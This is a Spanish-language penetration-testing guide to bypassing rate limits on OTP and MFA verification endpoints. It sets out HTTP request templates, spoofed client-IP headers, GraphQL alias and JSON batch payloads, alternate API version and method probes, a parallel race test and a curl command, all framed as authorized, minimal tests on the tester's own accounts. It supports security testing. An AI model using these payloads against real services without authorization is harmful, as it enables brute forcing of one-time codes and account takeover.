# 🗡️ Bypass de rate limit: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Control de cuota con pocos intentos

```http
POST /api/test-otp/check HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"code":"000000"}
```

**Cuándo usarlo:** Usar cuenta propia y un número mínimo permitido de intentos; anotar Retry-After y estado de bloqueo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/authentication).


### Cabeceras de IP aportadas por cliente

```text
X-Forwarded-For: 192.0.2.10
X-Real-IP: 192.0.2.11
Forwarded: for=192.0.2.12
True-Client-IP: 192.0.2.13
```

**Cuándo usarlo:** Probar una por vez; direcciones TEST-NET. El cambio de cabecera no prueba que el contador cambió.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Brute%20Force%20Rate%20Limit/README.md).


## 🧭 Payloads por contexto

### Cambios de superficie para la misma acción

```text
POST /api/v1/test-otp/check
POST /api/v2/test-otp/check
POST /graphql  → mutation verifyTestCode(...)
POST /api/test-otp/batch  → dos códigos propios
```

**Cuándo usarlo:** Solo comparar superficies que efectivamente ejecuten la misma verificación y estén en alcance.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Brute%20Force%20Rate%20Limit/README.md).


## 🔥 Payloads avanzados

### Dos alias GraphQL con control de presupuesto

```graphql
mutation {
  a: verifyTestCode(code:"000000") { ok }
  b: verifyTestCode(code:"000000") { ok }
}
```

**Cuándo usarlo:** Adaptar al esquema si verifyTestCode es una mutación. Dos alias bastan para comprobar si el contador se aplica por campo; no hacer fuerza bruta.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/graphql).


## 🔬 Pruebas guiadas por escenario

### 1. Línea base de tres intentos

**Objetivo:** Con un flujo OTP propio, enviar solo tres códigos inválidos distintos.

```http
POST /api/mfa/verify HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_PROPIO_MFA_PENDIENTE}
Content-Type: application/json

{"code":"{OTP_INVALIDO_PROPIO_1}"}
```

**Interpretación:** Repetir con OTP_INVALIDO_PROPIO_2 y 3; registrar contador, bloqueo y ventana. Ausencia de 429 no prueba límite ausente.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/multi-factor).

### 2. X-Forwarded-For no confiable

**Objetivo:** Comprobar si el contador usa un valor aportado por cliente.

```http
POST /api/mfa/verify HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_PROPIO_MFA_PENDIENTE}
X-Forwarded-For: 192.0.2.10
Content-Type: application/json

{"code":"{OTP_INVALIDO_PROPIO}"}
```

**Interpretación:** Comparar cuota real sin cabecera y, en otra request, con X-Real-IP; son variantes del mismo control de proxy.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).

### 3. Dos OTP simultáneos ante límite de uno

**Objetivo:** En laboratorio con cuota de un intento por ventana, enviar dos códigos inválidos propios a la vez.

```text
Burp Repeater: grupo paralelo de dos POST /api/mfa/verify bajo la misma sesión propia.
```

**Interpretación:** Registrar si ambos se procesan antes de actualizar contador. Dos respuestas HTTP iguales sin contador o efecto no prueban bypass.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits).

### 4. Cuenta frente a IP

**Objetivo:** Distinguir si el control protege a la identidad o solo a la conexión.

```text
Misma cuenta propia y endpoint /api/mfa/verify desde dos sesiones: 2 intentos inválidos por sesión.
```

**Interpretación:** Si el contador se separa por sesión, cuantificar ventana y precondiciones antes de afirmar riesgo de fuerza bruta.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/password-based).

### 5. Ruta de versión antigua

**Objetivo:** Comparar la misma acción bajo dos versiones en alcance.

```http
POST /api/v1/test-otp/check HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"code":"000000"}
```

**Interpretación:** Hacer pocos intentos y comparar con v2; si la ruta v1 no existe o responde genérico, no hay bypass.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).

### 6. Método alterno

**Objetivo:** Detectar si la cuota cubre GET y POST cuando ambos verifican el mismo factor.

```http
GET /api/mfa/verify?code={OTP_INVALIDO_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_PROPIO_MFA_PENDIENTE}
```

**Interpretación:** Solo comparar si GET realmente ejecuta la misma verificación; de lo contrario no es un bypass de cuota.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).

### 7. Respuesta 429 y Retry-After

**Objetivo:** Registrar la política del mismo endpoint tras una prueba permitida.

```bash
curl -sS -D - -o /dev/null -X POST -H "Authorization: Bearer {TOKEN_PROPIO_MFA_PENDIENTE}" -H "Content-Type: application/json" --data '{"code":"{OTP_INVALIDO_PROPIO}"}' "https://{ORIGEN}/api/mfa/verify"
```

**Interpretación:** Inspeccionar 429 y Retry-After sin superar la ventana; la cabecera sola no confirma que el límite proteja todas las rutas.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/authentication/password-based).

### 8. GraphQL con dos alias

**Objetivo:** Comprobar si la cuota cuenta operaciones dentro de una request.

```graphql
query { uno: verifyTestCode(code:"000000") { ok } dos: verifyTestCode(code:"000000") { ok } }
```

**Interpretación:** Máximo dos alias y cuenta propia; el esquema debe contener esa operación. Verificar contador real.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 9. Batch JSON mínimo

**Objetivo:** Comprobar si un lote de dos elementos elude la cuota por operación.

```json
[{"code":"000000"},{"code":"000000"}]
```

**Interpretación:** Si el endpoint admite lotes, medir si cada elemento se contabiliza; no escalar a fuerza bruta.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Brute%20Force%20Rate%20Limit).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
